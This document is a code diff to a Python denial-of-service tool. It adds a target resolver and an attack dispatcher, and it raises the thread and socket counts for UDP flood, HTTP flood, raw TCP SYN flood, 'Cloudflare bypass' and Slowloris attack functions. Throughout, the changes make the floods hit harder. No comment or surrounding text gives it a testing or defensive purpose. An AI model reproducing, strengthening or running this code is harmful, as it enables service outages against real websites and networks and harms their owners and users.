@@ -22,32 +22,60 @@ USER_AGENTS = [
 
 PROXY_LIST = []  # Populate with proxy servers if available
 
-def attack_udp_god(ip, port, duration):
+def resolve_target(target):
+    """Resolve a target (URL or IP) to IP address and port"""
+    try:
+        # If it's already an IP:port format
+        if ":" in target and not target.startswith("http"):
+            parts = target.split(":")
+            if len(parts) == 2:
+                return parts[0], int(parts[1])
+        
+        # Parse URL if it starts with http/https
+        if target.startswith("http"):
+            parsed = urlparse(target)
+            hostname = parsed.hostname
+            port = parsed.port or (443 if parsed.scheme == "https" else 80)
+        else:
+            # Assume it's a domain without scheme
+            hostname = target
+            port = 80  # Default to port 80
+        
+        # Resolve hostname to IP
+        ip = socket.gethostbyname(hostname)
+        return ip, port
+    except Exception as e:
+        raise ValueError(f"Could not resolve target: {target} - {str(e)}")
+
+def attack_udp_god(target, duration):
     """Enhanced UDP flood with more threads and larger packets"""
-    threads_count = 15
+    ip, port = resolve_target(target)
+    
+    threads_count = 50  # Increased thread count
     packet_size = 1450  # Maximum without fragmentation
     
     def flood():
         data = random._urandom(packet_size)
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         end_time = time.time() + duration
         
         while time.time() < end_time:
             try:
-                s.sendto(data, (ip, port))
-                # Send additional random packets
-                for _ in range(5):
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
+                
+                # Send multiple packets per connection
+                for _ in range(100):  # Send 100 packets per socket
                     if time.time() >= end_time:
                         break
-                    s.sendto(random._urandom(packet_size), (ip, port))
+                    s.sendto(data, (ip, port))
+                s.close()
             except:
                 try:
                     s.close()
                 except:
                     pass
-                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                time.sleep(0.01)
     
     # Start threads
     threads = []
@@ -65,10 +93,12 @@ def attack_udp_god(ip, port, duration):
         except:
             pass
 
-def attack_http_flood(ip, port, duration):
+def attack_http_flood(target, duration):
     """Enhanced HTTP flood with more sophisticated techniques"""
-    threads_count = 1000
+    ip, port = resolve_target(target)
     use_ssl = port == 443
+    
+    threads_count = 500  # Increased thread count
     
     # Enhanced headers and paths
     paths = [
@@ -136,7 +166,8 @@ def attack_http_flood(ip, port, duration):
                     
             except Exception as e:
                 try:
-                    sock.close()
+                    if sock:
+                        sock.close()
                 except:
                     pass
                 sock = None
@@ -158,9 +189,11 @@ def attack_http_flood(ip, port, duration):
         except:
             pass
 
-def attack_tcp_syn(ip, port, duration):
+def attack_tcp_syn(target, duration):
     """Powerful TCP SYN flood attack"""
-    threads_count = 10
+    ip, port = resolve_target(target)
+    
+    threads_count = 25  # Increased thread count
     
     def syn_flood():
         end_time = time.time() + duration
@@ -207,12 +240,18 @@ def attack_tcp_syn(ip, port, duration):
                                         source_port, dest_port, seq, ack_seq,
                                         tcp_offset, tcp_flags, window, check, urg_ptr)
                 
-                # Send packet
-                s.sendto(ip_header + tcp_header, (ip, 0))
+                # Send multiple packets
+                for _ in range(10):
+                    if time.time() >= end_time:
+                        break
+                    s.sendto(ip_header + tcp_header, (ip, 0))
                 s.close()
                 
             except Exception as e:
-                pass
+                try:
+                    s.close()
+                except:
+                    pass
     
     # Start threads
     threads = []
@@ -229,9 +268,20 @@ def attack_tcp_syn(ip, port, duration):
         except:
             pass
 
-def attack_cloudflare_bypass(url, duration):
+def attack_cloudflare_bypass(target, duration):
     """Advanced Cloudflare bypass using various techniques"""
-    threads_count = 50
+    # Extract hostname from URL if needed
+    if target.startswith("http"):
+        parsed = urlparse(target)
+        hostname = parsed.hostname
+        port = parsed.port or (443 if parsed.scheme == "https" else 80)
+        url = target
+    else:
+        hostname = target
+        port = 80
+        url = f"http://{target}"
+    
+    threads_count = 100  # Increased thread count
     
     def bypass_attack():
         end_time = time.time() + duration
@@ -282,11 +332,13 @@ def attack_cloudflare_bypass(url, duration):
         except:
             pass
 
-def attack_slowloris(ip, port, duration):
+def attack_slowloris(target, duration):
     """Advanced Slowloris attack with more connections"""
-    sockets_count = 500
-    sockets = []
+    ip, port = resolve_target(target)
     use_ssl = port == 443
+    
+    sockets_count = 1000  # Increased socket count
+    sockets = []
     
     # Create initial sockets
     for _ in range(sockets_count):
@@ -344,4 +396,20 @@ def attack_slowloris(ip, port, duration):
         except:
             pass
 
+# Attack dispatcher for easy calling
+ATTACK_METHODS = {
+    "udp": attack_udp_god,
+    "http": attack_http_flood,
+    "syn": attack_tcp_syn,
+    "cloudflare": attack_cloudflare_bypass,
+    "slowloris": attack_slowloris,
+}
 
+def launch_attack(method, target, duration):
+    """Launch an attack with the specified method"""
+    if method in ATTACK_METHODS:
+        print(f"Starting {method} attack on {target} for {duration} seconds")
+        ATTACK_METHODS[method](target, duration)
+        print(f"{method} attack on {target} completed")
+    else:
+        print(f"Unknown attack method: {method}")
